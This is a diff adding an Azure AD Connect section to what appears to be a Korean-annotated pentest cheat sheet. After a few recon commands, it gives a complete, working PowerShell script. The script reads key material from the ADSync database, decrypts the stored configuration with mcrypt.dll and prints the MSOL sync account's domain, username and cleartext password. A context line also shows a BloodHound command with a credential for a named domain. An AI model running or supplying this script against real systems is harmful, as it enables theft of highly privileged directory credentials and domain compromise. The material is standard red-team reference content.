@@ -566,3 +566,140 @@ bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.co
 ```
   
 </details>
+
+---
+<details>
+  <summary><strong>Azure AD Connect</strong></summary>
+
+## Recon
+```powershell
+# 서비스 확인
+Get-Service -Name "ADSync" -ErrorAction SilentlyContinue
+
+# 설치 경로 확인
+Test-Path "C:\Program Files\Microsoft Azure AD Sync"
+
+# 버전 확인
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Azure AD Connect"
+```
+
+## Exploit
+```powershell
+# ========================================
+# Azure AD Connect MSOL 계정 추출 스크립트
+# ========================================
+
+# 환경 자동 탐지 및 연결
+function Get-ADSyncConnection {
+    # 1. LocalDB 먼저 시도
+    try {
+        Write-Host "[*] Trying LocalDB connection..." -ForegroundColor Yellow
+        $localDBConn = "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
+        $testClient = New-Object System.Data.SqlClient.SqlConnection -ArgumentList $localDBConn
+        $testClient.Open()
+        $testClient.Close()
+        Write-Host "[+] LocalDB found!" -ForegroundColor Green
+        return $localDBConn
+    } catch {
+        Write-Host "[-] LocalDB not available" -ForegroundColor Red
+    }
+
+    # 2. 전체 SQL Server 시도
+    try {
+        Write-Host "[*] Trying full SQL Server connection..." -ForegroundColor Yellow
+        $sqlServerConn = "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
+        $testClient = New-Object System.Data.SqlClient.SqlConnection -ArgumentList $sqlServerConn
+        $testClient.Open()
+        $testClient.Close()
+        Write-Host "[+] SQL Server found!" -ForegroundColor Green
+        return $sqlServerConn
+    } catch {
+        Write-Host "[-] SQL Server not available" -ForegroundColor Red
+    }
+
+    throw "No SQL connection available"
+}
+
+# 메인 실행
+try {
+    # 자동으로 적절한 연결 문자열 선택
+    $connectionString = Get-ADSyncConnection
+    
+    Write-Host "`n[*] Connecting to database..." -ForegroundColor Yellow
+    $client = New-Object System.Data.SqlClient.SqlConnection -ArgumentList $connectionString
+    $client.Open()
+    
+    # 키 정보 추출
+    Write-Host "[*] Extracting encryption keys..." -ForegroundColor Yellow
+    $cmd = $client.CreateCommand()
+    $cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+    $reader = $cmd.ExecuteReader()
+    $reader.Read() | Out-Null
+    $key_id = $reader.GetInt32(0)
+    $instance_id = $reader.GetGuid(1)
+    $entropy = $reader.GetGuid(2)
+    $reader.Close()
+    
+    # 암호화된 설정 추출
+    Write-Host "[*] Extracting encrypted configuration..." -ForegroundColor Yellow
+    $cmd = $client.CreateCommand()
+    $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
+    $reader = $cmd.ExecuteReader()
+    
+    if (-not $reader.Read()) {
+        throw "No AD management agent found"
+    }
+    
+    $config = $reader.GetString(0)
+    $crypted = $reader.GetString(1)
+    $reader.Close()
+    $client.Close()
+    
+    # mcrypt.dll 로드 및 복호화
+    Write-Host "[*] Decrypting password..." -ForegroundColor Yellow
+    $mcryptPath = 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
+    
+    if (-not (Test-Path $mcryptPath)) {
+        throw "mcrypt.dll not found at $mcryptPath"
+    }
+    
+    Add-Type -Path $mcryptPath
+    $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+    $km.LoadKeySet($entropy, $instance_id, $key_id)
+    $key = $null
+    $km.GetActiveCredentialKey([ref]$key)
+    $key2 = $null
+    $km.GetKey(1, [ref]$key2)
+    $decrypted = $null
+    $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+    
+    # 자격증명 파싱
+    Write-Host "[*] Parsing credentials..." -ForegroundColor Yellow
+    $domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | 
+              select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
+    $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | 
+                select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
+    $password = select-xml -Content $decrypted -XPath "//attribute" | 
+                select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
+    
+    # 결과 출력
+    Write-Host "`n========================================" -ForegroundColor Cyan
+    Write-Host "MSOL Account Credentials" -ForegroundColor Cyan
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host ("Domain:   " + $domain.Domain) -ForegroundColor Green
+    Write-Host ("Username: " + $username.Username) -ForegroundColor Green
+    Write-Host ("Password: " + $password.Password) -ForegroundColor Green
+    Write-Host "========================================`n" -ForegroundColor Cyan
+    
+} catch {
+    Write-Host "`n[!] Error: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host $_.ScriptStackTrace -ForegroundColor Red
+} finally {
+    if ($client -and $client.State -eq 'Open') {
+        $client.Close()
+    }
+}
+```
+- https://blog.xpnsec.com/azuread-connect-for-redteam/
+  
+</details>
